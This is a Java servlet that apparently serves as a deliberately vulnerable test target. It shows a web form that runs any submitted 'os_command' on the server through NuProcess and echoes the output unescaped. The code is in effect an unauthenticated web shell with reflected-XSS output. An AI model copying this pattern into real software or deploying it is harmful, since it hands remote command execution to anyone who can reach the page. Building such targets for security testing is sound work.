package com.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

import java.lang.ProcessBuilder; // Oops!
import java.lang.Process;
import com.zaxxer.nuprocess.NuProcess;
import com.zaxxer.nuprocess.NuProcessBuilder;
import com.zaxxer.nuprocess.NuAbstractProcessHandler;
import java.lang.Thread;
import java.lang.InterruptedException;

import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.nio.ByteBuffer;

import java.util.List;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.lang.StringBuilder;
import java.lang.System;

class GlobalVariable{
	public static String CommandResultString = new String();
}

class ProcessHandler extends NuAbstractProcessHandler {
   private NuProcess nuProcess;

   @Override
   public void onStart(NuProcess nuProcess) {
      this.nuProcess = nuProcess;
   }
   
   // @Override
   // public boolean onStdinReady(ByteBuffer buffer) {
   //    buffer.put("Hello world!".getBytes());
   //    buffer.flip();
   //    return false;
   // }

   @Override
   public void onStdout(ByteBuffer buffer, boolean closed) {
      if (!closed) {
         byte[] bytes = new byte[buffer.remaining()];
         buffer.get(bytes);
         GlobalVariable.CommandResultString = new String(bytes);
         System.out.println(GlobalVariable.CommandResultString);
         nuProcess.closeStdin(true);
      }
   }
}

@WebServlet(urlPatterns = {"/"}, loadOnStartup = 1)
public class HelloWorldServlet extends HttpServlet 
{
  @Override 
  public void doGet(HttpServletRequest request, HttpServletResponse response) 
      throws IOException
  {
      response.setContentType("text/html; charset=UTF-8");
      response.getOutputStream().println("<title>test</title>");
      response.getOutputStream().println("<link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\" crossorigin=\"anonymous\">");
      response.getOutputStream().println("<div class='container'>");
      response.getOutputStream().println("<br>");
      response.getOutputStream().println("<form action='/' method='post'>");
      response.getOutputStream().print("Command: ");
      response.getOutputStream().print("<input type='input' name='os_command' class='form-control' style='width:300px;display:inline;'>");
      response.getOutputStream().print(" <input type='submit' class='btn btn-primary' value='SEND'>");
      response.getOutputStream().println("</form>");
      response.getOutputStream().println("</div>");
  }

  @Override
  public void doPost(HttpServletRequest request, HttpServletResponse response)
      throws IOException
  {
  	String inputCommand = request.getParameter("os_command");
  	String commandResult = "";
    // try{
    //   commandResult = commandProcess(command);
    //   Thread.sleep(2);
    // }catch(InterruptedException e){
    //   System.out.println(e);
    // }
    try{
      commandResult = nuCommandProcess(inputCommand);
      Thread.sleep(20);
    }catch(InterruptedException e){
      System.out.println(e);
    }
  	response.setContentType("text/html; charset=UTF-8");
  	response.getOutputStream().println("<title>test</title>");
  	response.getOutputStream().println("<link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\" crossorigin=\"anonymous\">");
  	response.getOutputStream().println("<br>");
  	response.getOutputStream().println("<hr>");
  	response.getOutputStream().println(commandResult);
  }

  // this method is for java.lang.ProcessBuilder/Process
  private String commandProcess(String out) throws IOException, InterruptedException{
  	List<String> commandAndParams = Arrays.asList(out.split(" ", 5));
  	ProcessBuilder pb = new ProcessBuilder(commandAndParams);
  	Process process = pb.start();
  	process.waitFor();
  	System.out.println("Starting "+out);
  	InputStream is = process.getInputStream();
  	String commandResult = printInputStream(is);
  	InputStream es = process.getErrorStream();
  	printInputStream(es);
  	return commandResult;
  }

  private String nuCommandProcess(String out) throws IOException, InterruptedException{
    List<String> commandAndParams = Arrays.asList(out.split(" ", 5));
  	NuProcessBuilder pb = new NuProcessBuilder(commandAndParams);
  	ProcessHandler handler = new ProcessHandler();
  	pb.setProcessListener(handler);
  	NuProcess process = pb.start();
  	ByteBuffer commandResultByte = ByteBuffer.allocate(1024);
  	process.writeStdin(commandResultByte);
  	process.waitFor(0, TimeUnit.SECONDS);
  	return GlobalVariable.CommandResultString;
  }

  public static String printInputStream(InputStream is) throws IOException, InterruptedException{
  	BufferedReader br = new BufferedReader(new InputStreamReader(is));
  	StringBuilder sb = new StringBuilder();
  	char[] b = new char[1024];
  	int line;
  	while(0 <= (line = br.read(b))){
  		sb.append(b, 0, line);
  	}
  	String result_string = sb.toString();
  	System.out.println(result_string);
  	return result_string;
  }

}
